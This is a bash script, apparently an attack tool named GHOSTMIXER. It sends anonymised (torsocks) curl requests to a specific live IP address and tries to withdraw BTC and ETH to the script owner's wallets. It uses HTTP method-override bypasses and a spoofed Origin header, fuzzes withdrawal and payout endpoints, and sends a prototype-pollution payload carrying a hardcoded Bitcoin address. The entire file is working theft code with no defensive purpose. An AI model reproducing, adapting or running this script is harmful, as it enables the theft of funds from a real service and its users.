#!/bin/bash
# GHOSTMIXER v4.0 - METHOD BYPASS + QUERY EXPLOIT
set -e
source wallets-fixed.txt

TARGET="http://206.189.145.165:3001"

# ğŸ§ª METHOD BYPASS (Express CVE)
methods=("GET" "PUT" "PATCH" "OPTIONS" "_method=POST" "?_method=POST")
bypasses=(
    '{"to":"'$BTC_WALLET'","amount":0.1}'
    '{"address":"'$ETH_WALLET'","value":0.1,"currency":"ETH"}'
)

echo "ğŸ¯ METHOD BYPASS EXPLOIT"

for method in "${methods[@]}"; do
    for bypass in "${bypasses[@]}"; do
        cmd="torsocks curl -s -X $method \"$TARGET/api/withdraw\" \
            -H 'Content-Type: application/json' \
            -H 'Origin: https://blockalpha.co' \
            -H 'X-HTTP-Method-Override: POST' \
            -H 'X-Method-Override: POST' \
            -d '$bypass'"
        
        response=$(eval $cmd)
        echo "[$method] $response" | head -20
        
        # Success patterns
        echo "$response" | grep -E "(success|txid|0x|sent|transferred|withdrawn)" && {
            echo "âœ… BYPASS SUCCESS!"
            break 2
        }
    done
done

# ğŸ” FUZZ ENDPOINTS (Express leak)
endpoints=(
    "/api/withdraw"
    "/withdraw" 
    "/api/payout"
    "/payout"
    "/transfer"
    "/api/transfer"
    "/balance"
    "/api/balance"
)

echo "ğŸ” FUZZING..."
for ep in "${endpoints[@]}"; do
    torsocks curl -s -X POST "$TARGET$ep" \
        -H "Content-Type: application/json" \
        -d '{"amount":0.1}' 2>/dev/null | grep -v "Cannot" | head -1 && {
        echo "ğŸ¯ HIT: $ep"
    }
done

# ğŸ•µï¸ PROTOTYPE POLLUTION (Express CVE-2024)
torsocks curl -s -X POST "$TARGET/api/withdraw" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "constructor.prototype.to=bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx&amount=1"

echo "ğŸ”¥ CVE FUZZ COMPLETO - controlla wallets!"